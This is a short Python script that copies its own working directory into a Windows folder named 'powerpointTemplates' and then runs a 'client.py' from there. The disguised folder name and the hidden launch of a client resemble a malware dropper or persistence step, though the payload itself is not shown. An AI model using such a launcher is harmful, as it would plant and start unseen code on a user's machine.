from os.path import dirname, abspath
import os
from distutils.dir_util import copy_tree
from subprocess import call
import time

father_path = dirname(dirname(abspath(__file__))) # /home/kristina/desire-directory
name_of_this_file = os.path.basename(os.getcwd())

abs_path = f'{father_path}/{name_of_this_file}'
print(abs_path)
dest = 'D:\powerpointTemplates'
copy_tree(f"{abs_path}", f"{dest}")

client_run = f'{dest}/client.py'
time.sleep(3)
call(["python", f"{client_run}"])
